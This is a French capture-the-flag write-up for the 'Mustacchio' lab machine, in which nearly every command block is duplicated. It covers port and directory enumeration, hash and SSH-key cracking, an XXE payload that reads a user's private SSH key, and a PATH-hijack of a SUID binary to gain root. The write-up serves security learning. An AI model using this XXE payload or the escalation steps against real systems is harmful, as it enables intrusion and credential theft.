@@ -1,0 +1,491 @@
+Mustacchio
+
+   Le but de ce test de pénétration est de trouver un moyen de prendre le
+   contrôle d'une machine. Le but est donc de trouver une faille dans la
+   machine, de l'exploiter et d'arriver à devenir l'utilisateur root et de
+   trouver des éléments importants : les flags.
+
+   Dans un premier temps, utilisation de la commande nmap pour essayer de
+   voir quels ports sont ouverts sur l'IP de la machine :
+
+   nmap -Pn -sV -sC -p- 10.10.255.145
+┌──(fracorbas㉿kali)-[~/Documents/VPN]
+└─$ nmap -Pn -sV -sC -p- 10.10.255.145
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-28 20:41 CET
+Nmap scan report for 10.10.255.145
+Host is up (0.035s latency).
+Not shown: 65532 filtered tcp ports (no-response)
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol
+2.0)
+| ssh-hostkey:
+|   2048 58:1b:0c:0f:fa:cf:05:be:4c:c0:7a:f1:f1:88:61:1c (RSA)
+|   256 3c:fc:e8:a3:7e:03:9a:30:2c:77:e0:0a:1c:e4:52:e6 (ECDSA)
+|_  256 9d:59:c6:c7:79:c5:54:c4:1d:aa:e4:d1:84:71:01:92 (ED25519)
+80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
+|_http-title: Mustacchio | Home
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+| http-robots.txt: 1 disallowed entry
+|_/
+8765/tcp open  http    nginx 1.10.3 (Ubuntu)
+|_http-server-header: nginx/1.10.3 (Ubuntu)
+|_http-title: Mustacchio | Login
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap
+.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 138.89 seconds
+┌──(fracorbas㉿kali)-[~/Documents/VPN]
+└─$ nmap -Pn -sV -sC -p- 10.10.255.145
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-28 20:41 CET
+Nmap scan report for 10.10.255.145
+Host is up (0.035s latency).
+Not shown: 65532 filtered tcp ports (no-response)
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol
+2.0)
+| ssh-hostkey:
+|   2048 58:1b:0c:0f:fa:cf:05:be:4c:c0:7a:f1:f1:88:61:1c (RSA)
+|   256 3c:fc:e8:a3:7e:03:9a:30:2c:77:e0:0a:1c:e4:52:e6 (ECDSA)
+|_  256 9d:59:c6:c7:79:c5:54:c4:1d:aa:e4:d1:84:71:01:92 (ED25519)
+80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
+|_http-title: Mustacchio | Home
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+| http-robots.txt: 1 disallowed entry
+|_/
+8765/tcp open  http    nginx 1.10.3 (Ubuntu)
+|_http-server-header: nginx/1.10.3 (Ubuntu)
+|_http-title: Mustacchio | Login
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap
+.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 138.89 seconds
+
+   Ici, on remarque que l'on a 3 ports ouverts, dont 2 en HTTP. Dans un
+   premier temps, je vais me concentrer sur les deux en HTTP.
+
+   Pour commencer, je vais essayer de trouver des documents / dossiers /
+   fichiers dans le site web en brute force via l'outil gobuster :
+
+   gobuster dir -u [http://10.10.255.14](http://10.10.255.149)5 -w
+   /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+
+┌──(fracorbas㉿kali)-[~/Documents/VPN]
+└─$ gobuster dir -u http://10.10.255.145 -w /usr/share/wordlists/dirbuster/direc
+tory-list-2.3-medium.txt
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.10.255.145
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-m
+edium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/images               (Status: 301) [Size: 315] [--> http://10.10.255.145/images
+/]
+/custom               (Status: 301) [Size: 315] [--> http://10.10.255.145/custom
+/]
+/fonts                (Status: 301) [Size: 314] [--> http://10.10.255.145/fonts/
+]
+┌──(fracorbas㉿kali)-[~/Documents/VPN]
+└─$ gobuster dir -u http://10.10.255.145 -w /usr/share/wordlists/dirbuster/direc
+tory-list-2.3-medium.txt
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.10.255.145
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-m
+edium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/images               (Status: 301) [Size: 315] [--> http://10.10.255.145/images
+/]
+/custom               (Status: 301) [Size: 315] [--> http://10.10.255.145/custom
+/]
+/fonts                (Status: 301) [Size: 314] [--> http://10.10.255.145/fonts/
+]
+
+   En recherchant un peu avec ce résultat (en regardant dans les sources
+   du site), on tombe ici :
+   6a4d0c1304b89255d0a73ba5a4bc18d3.png
+
+   On utilise donc la commande curl afin de récupérer le fichier que l'on
+   a sur le site web:
+┌──(fracorbas㉿kali)-[~/Documents/Hacking/Mustaccio]
+└─$ curl 10.10.255.145/custom/js/users.bak -o users.bak
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100  8192  100  8192    0     0   127k      0 --:--:-- --:--:-- --:--:--  129k
+┌──(fracorbas㉿kali)-[~/Documents/Hacking/Mustaccio]
+└─$ curl 10.10.255.145/custom/js/users.bak -o users.bak
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100  8192  100  8192    0     0   127k      0 --:--:-- --:--:-- --:--:--  129k
+
+   pour avoir le fichier où on trouve :
+┌──(fracorbas㉿kali)-[~/Documents/Hacking/Mustaccio]
+└─$ cat users.bak
+��0]admin1868e36a6d2b17d4c2745f1659433a54d4bc5f4b
+┌──(fracorbas㉿kali)-[~/Documents/Hacking/Mustaccio]
+└─$ cat users.bak
+��0]admin1868e36a6d2b17d4c2745f1659433a54d4bc5f4b
+
+   Ce qui ressemble fortement à un hash, donc j'essaie de le craquer dans
+   un premier temps en utilisant des sites web tel que
+   https://crackstation.net
+   76f9d6d0238bc663e7ff4cb264799b98.png
+
+   On trouve alors le mot de passe : bulldog19
+
+   On avait remarqué que dans le retour du nmap, on avait un port étrange
+   en http, qui en fait abrite un formulaire :
+   878f586ab142189632b36ece789a83bb.png
+
+   On rentre donc les informations que l'on a trouvé (le login admin était
+   présent dans le fichier que l'on a récupéré)
+
+   Et on arrive sur une page sur laquelle on peut donner un commentaire :
+   341e6e39aba000aefbc13c59458679c1.png
+
+   On voit que l'on a des commentaires intéressants dans le code :
+   7f3e534a903664f75ea01a50accda717.png
+
+   Donc probablement un utilisateur barry et une clé dans un fichier sur
+   /auth/dontforget.bak
+┌──(fracorbas㉿kali)-[~/Documents/Hacking/Mustaccio]
+└─$ curl 10.10.255.145:8765/auth/dontforget.bak -o dontforget.bak
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100   996  100   996    0     0  16031      0 --:--:-- --:--:-- --:--:-- 16064
+┌──(fracorbas㉿kali)-[~/Documents/Hacking/Mustaccio]
+└─$ curl 10.10.255.145:8765/auth/dontforget.bak -o dontforget.bak
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100   996  100   996    0     0  16031      0 --:--:-- --:--:-- --:--:-- 16064
+
+   mais on trouve ça dedans :
+┌──(fracorbas㉿kali)-[~/Documents/Hacking/Mustaccio]
+└─$ cat dontforget.bak
+<?xml version="1.0" encoding="UTF-8"?>
+<comment>
+  <name>Joe Hamd</name>
+  <author>Barry Clad</author>
+  <com>his paragraph was a waste of time and space. If you had not read this and
+ I had not typed this you and I could’ve done something more productive than rea
+ding this mindlessly and carelessly as if you did not have anything else to do i
+n life. Life is so precious because it is short and you are being so careless th
+at you do not realize it until now since this void paragraph mentions that you a
+re doing something so mindless, so stupid, so careless that you realize that you
+ are not using your time wisely. You could’ve been playing with your dog, or eat
+ing your cat, but no. You want to read this barren paragraph and expect somethin
+g marvelous and terrific at the end. But since you still do not realize that you
+ are wasting precious time, you still continue to read the null paragraph. If yo
+u had not noticed, you have wasted an estimated time of 20 seconds.</com>
+</comment>
+┌──(fracorbas㉿kali)-[~/Documents/Hacking/Mustaccio]
+└─$ cat dontforget.bak
+<?xml version="1.0" encoding="UTF-8"?>
+<comment>
+  <name>Joe Hamd</name>
+  <author>Barry Clad</author>
+  <com>his paragraph was a waste of time and space. If you had not read this and
+ I had not typed this you and I could’ve done something more productive than rea
+ding this mindlessly and carelessly as if you did not have anything else to do i
+n life. Life is so precious because it is short and you are being so careless th
+at you do not realize it until now since this void paragraph mentions that you a
+re doing something so mindless, so stupid, so careless that you realize that you
+ are not using your time wisely. You could’ve been playing with your dog, or eat
+ing your cat, but no. You want to read this barren paragraph and expect somethin
+g marvelous and terrific at the end. But since you still do not realize that you
+ are wasting precious time, you still continue to read the null paragraph. If yo
+u had not noticed, you have wasted an estimated time of 20 seconds.</com>
+</comment>
+
+   Et c'est du XML, cependant je n'ai pour l'instant aucun élément me
+   permettant d'utiliser ce fichier.
+
+   mais elle ne donne rien sur le site lorsque l'on envoie ce que l'on a
+   donné.
+
+   Ensuite, je suis retourné sur la page où on peut fournir un
+   commentaire, et j'ai remarqué que les titre dans le "comment preview"
+   sont identique aux éléments que l'on retrouve dans le fichier XML que
+   l'on a récupéré.
+
+   J'essaie donc de mettre le contenu du fichier dans l'input et :
+   a6a628803e9009905c69709c93f44718.png
+
+   Bingo, cela signifie que le XML est interprété par le champ du
+   commentaire. Donc il y a probablement un moyen d'utiliser du XML pour
+   récupérer des fichiers nous permettant de gagner un accès sur le
+   serveur.
+
+   En recherchant des éléments me permettant d'avancer, je tombe sur ce
+   repo GitHub :
+
+   https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE
+   Injection
+   b3c0d0accd8fdd49c783629812fbfbfa.png
+
+   On a vu que dans un commentaire que barry avait un accès en SSH, ou du
+   moins qu'il avait une clé SSH qu'il pouvait utiliser. Je devine donc
+   l'emplacement de cette clé qui par défaut est dans le répertoire .ssh
+   de la home dir d'un utilisateur :
+   691a213e43ee935af2d03b2f77425709.png
+<?xml version="1.0"?>
+<!DOCTYPE root
+[<!ENTITY test SYSTEM 'file:///home/barry/.ssh/id_rsa'>]><comment>&test;</commen
+t>
+<?xml version="1.0"?>
+<!DOCTYPE root
+[<!ENTITY test SYSTEM 'file:///home/barry/.ssh/id_rsa'>]><comment>&test;</commen
+t>
+
+   Et bingo, on a pu récupérer la clé SSH de barry.
+
+   On récupère la clé dans le format donné par la source de la page
+   : FAIRE CTRL+U pour que l'on puisse utiliser ssh2john afin de craquer
+   la clé. Car sinon la clé n'est pas reconnue ni par john, ni pas ssh qui
+   ne reconnait pas la clé s'il n'y a pas les retours à la ligne.
+
+   on utilise alors ssh2john id_rsa > key
+
+     La clé étant une clé ssh, on utilise ssh2john pour la mettre dans le
+     format que préfère l'utilitaire john
+
+   puis On essaie de bruteforce le mot de passe protégeant cette clé :
+┌──(fracorbas㉿kali)-[~/Documents/Hacking/Mustaccio]
+└─$ john --wordlist=../../rockyou.txt key
+Using default input encoding: UTF-8
+Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
+Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hash
+es
+Cost 2 (iteration count) is 1 for all loaded hashes
+Will run 16 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+urieljames       (id_rsa)
+1g 0:00:00:00 DONE (2024-03-28 21:40) 2.272g/s 6751Kp/s 6751Kc/s 6751KC/s uriely
+air789..urielandrea
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed.
+┌──(fracorbas㉿kali)-[~/Documents/Hacking/Mustaccio]
+└─$ john --wordlist=../../rockyou.txt key
+Using default input encoding: UTF-8
+Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
+Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hash
+es
+Cost 2 (iteration count) is 1 for all loaded hashes
+Will run 16 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+urieljames       (id_rsa)
+1g 0:00:00:00 DONE (2024-03-28 21:40) 2.272g/s 6751Kp/s 6751Kc/s 6751KC/s uriely
+air789..urielandrea
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed.
+
+   on a donc le mot de passe de la clé.
+
+   et on se connecte en pensant bien à modifier les droits de la clé
+   en chmod 600 id_rsa :
+┌──(fracorbas㉿kali)-[~/Documents/Hacking/Mustaccio]
+└─$ ssh -i id_rsa barry@10.10.255.145
+Enter passphrase for key 'id_rsa':
+Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.4.0-210-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+34 packages can be updated.
+16 of these updates are security updates.
+To see these additional updates run: apt list --upgradable
+
+The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+barry@mustacchio:~$
+┌──(fracorbas㉿kali)-[~/Documents/Hacking/Mustaccio]
+└─$ ssh -i id_rsa barry@10.10.255.145
+Enter passphrase for key 'id_rsa':
+Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.4.0-210-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+34 packages can be updated.
+16 of these updates are security updates.
+To see these additional updates run: apt list --upgradable
+
+The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+barry@mustacchio:~$
+
+   On regarde alors les fichiers qui ont les droits s :
+barry@mustacchio:~$ find / -perm -u=s -type f 2>/dev/null
+/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/snapd/snap-confine
+/usr/lib/openssh/ssh-keysign
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/bin/passwd
+/usr/bin/pkexec
+/usr/bin/chfn
+/usr/bin/newgrp
+/usr/bin/at
+/usr/bin/chsh
+/usr/bin/newgidmap
+/usr/bin/sudo
+/usr/bin/newuidmap
+/usr/bin/gpasswd
+/home/joe/live_log
+/bin/ping
+/bin/ping6
+/bin/umount
+/bin/mount
+/bin/fusermount
+/bin/su
+barry@mustacchio:~$ find / -perm -u=s -type f 2>/dev/null
+/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/snapd/snap-confine
+/usr/lib/openssh/ssh-keysign
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/bin/passwd
+/usr/bin/pkexec
+/usr/bin/chfn
+/usr/bin/newgrp
+/usr/bin/at
+/usr/bin/chsh
+/usr/bin/newgidmap
+/usr/bin/sudo
+/usr/bin/newuidmap
+/usr/bin/gpasswd
+/home/joe/live_log
+/bin/ping
+/bin/ping6
+/bin/umount
+/bin/mount
+/bin/fusermount
+/bin/su
+
+   On voit alors que live_log a les droits sudo
+
+   et ça écrits des logs :
+barry@mustacchio:/$ ./home/joe/live_log
+10.9.155.133 - - [28/Mar/2024:20:03:44 +0000] "POST /home.php HTTP/1.1" 200 1123
+ "http://10.10.255.145:8765/home.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64;
+ rv:109.0) Gecko/20100101 Firefox/123.0"
+10.9.155.133 - - [28/Mar/2024:20:04:04 +0000] "POST /home.php HTTP/1.1" 200 1123
+ "http://10.10.255.145:8765/home.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64;
+ rv:109.0) Gecko/20100101 Firefox/123.0"
+10.9.155.133 - - [28/Mar/2024:20:05:01 +0000] "POST /home.php HTTP/1.1" 200 1123
+ "http://10.10.255.145:8765/home.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64;
+ rv:109.0) Gecko/20100101 Firefox/123.0"
+10.9.155.133 - - [28/Mar/2024:20:05:22 +0000] "POST /home.php HTTP/1.1" 200 1131
+ "http://10.10.255.145:8765/home.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64;
+ rv:109.0) Gecko/20100101 Firefox/123.0"
+10.9.155.133 - - [28/Mar/2024:20:06:13 +0000] "POST /home.php HTTP/1.1" 200 1123
+ "http://10.10.255.145:8765/home.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64;
+ rv:109.0) Gecko/20100101 Firefox/123.0"
+barry@mustacchio:/$ ./home/joe/live_log
+10.9.155.133 - - [28/Mar/2024:20:03:44 +0000] "POST /home.php HTTP/1.1" 200 1123
+ "http://10.10.255.145:8765/home.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64;
+ rv:109.0) Gecko/20100101 Firefox/123.0"
+10.9.155.133 - - [28/Mar/2024:20:04:04 +0000] "POST /home.php HTTP/1.1" 200 1123
+ "http://10.10.255.145:8765/home.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64;
+ rv:109.0) Gecko/20100101 Firefox/123.0"
+10.9.155.133 - - [28/Mar/2024:20:05:01 +0000] "POST /home.php HTTP/1.1" 200 1123
+ "http://10.10.255.145:8765/home.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64;
+ rv:109.0) Gecko/20100101 Firefox/123.0"
+10.9.155.133 - - [28/Mar/2024:20:05:22 +0000] "POST /home.php HTTP/1.1" 200 1131
+ "http://10.10.255.145:8765/home.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64;
+ rv:109.0) Gecko/20100101 Firefox/123.0"
+10.9.155.133 - - [28/Mar/2024:20:06:13 +0000] "POST /home.php HTTP/1.1" 200 1123
+ "http://10.10.255.145:8765/home.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64;
+ rv:109.0) Gecko/20100101 Firefox/123.0"
+
+   En utilisant la commande strings (permet de déchiffrer le binaire d'un
+   exécutable pour afficher de l'ascii dans la CLI), on peut voir que l'on
+   a cette commande qui est utilisée dans le script :
+tail -f /var/log/nginx/access.log
+tail -f /var/log/nginx/access.log
+
+   Sauf que la commande est utilisée par son nom et pas par le chemin
+   absolu de la commande.
+   Et la commande tail est présente dans la variable d'environnement $PATH
+   :
+barry@mustacchio:/$ echo $PATH
+/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/loc
+al/games:/snap/bin
+barry@mustacchio:/$ echo $PATH
+/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/loc
+al/games:/snap/bin
+
+   Vu que la commande utilise la PATH pour se repérer et aller chercher le
+   script, on peut simplement ajouter un dossier contenant un script nommé
+   tail qui sera en réalité notre porte d'entrée pour devenir root.
+
+   On peut donc modifier le PATH, afin de lancer une commande en root.
+barry@mustacchio:~$ echo /bin/bash > tail
+barry@mustacchio:~$ echo /bin/bash > tail
+
+   On créé simplement un fichier
+
+   Ensuite, on ajoute notre dossier dans le PATH :
+export PATH=$(pwd):$PATH
+export PATH=$(pwd):$PATH
+
+     nous permet de mettre notre dossier actuel dans le PATH
+
+   On donne alors le droit en exécution à notre fichier :
+barry@mustacchio:~$ chmod +x tail
+barry@mustacchio:~$ chmod +x tail
+
+   On voit alors que notre path contient bien notre dossier actuel :
+barry@mustacchio:~$ echo $PATH
+/home/barry:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/ga
+mes:/usr/local/games:/snap/bin
+barry@mustacchio:~$ echo $PATH
+/home/barry:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/ga
+mes:/usr/local/games:/snap/bin
+
+   plus qu'à lancer le script :
+barry@mustacchio:~$ /home/joe/live_log
+root@mustacchio:~# cat /root/
+.bashrc   .profile  root.txt  .ssh/
+root@mustacchio:~# cat /root/root.txt
+3223581420d906c4dd1a5f9b530393a5
+barry@mustacchio:~$ /home/joe/live_log
+root@mustacchio:~# cat /root/
+.bashrc   .profile  root.txt  .ssh/
+root@mustacchio:~# cat /root/root.txt
+3223581420d906c4dd1a5f9b530393a5
+
+   et on est root
